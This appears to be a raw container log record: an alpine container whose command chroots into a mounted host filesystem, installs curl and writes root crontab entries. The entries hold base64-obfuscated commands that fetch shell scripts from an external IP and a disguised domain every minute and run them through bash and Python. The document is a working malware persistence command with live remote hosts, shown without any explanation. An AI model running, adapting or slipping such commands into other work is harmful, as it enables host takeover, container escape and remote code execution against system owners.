	Image: alpine
	ID: 6754996ff03ccd744324e9317941d66e30fe8c2cf96cdb031e1d21e84f25d849
	Command: chroot /mnt/ /bin/sh -c 'if ! type curl >/dev/null;then apt-get install -y curl;apt-get install -y --reinstall curl;yum clean all;yum install -y curl;yum reinstall -y curl;fi; echo '* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTg1LjE2MS43MC42Ny9iMmY2MjgvY3JvbmIuc2gK|base64 -d|bash|bash' >/etc/crontab && echo '* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8va2lcXHNcXHMuYS1kXFxvZy50XFxvXHAvYjJmNjI4L2Nyb25iLnNoCg==|base64 -d|bash|bash' >/etc/cron.d/zzh && echo KiAqICogKiAqIHJvb3QgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMjsgcHJpbnQgdXJsbGliMi51cmxvcGVuKCdodHRwOi8va2lcXHNcXHMuYS1kXFxvZy50XFxvXHAvdC5zaCcpLnJlYWQoKSIgPi4xO2NobW9kICt4IC4xOy4vLjEK|base64 -d >>/etc/crontab'
	Created:1677159414
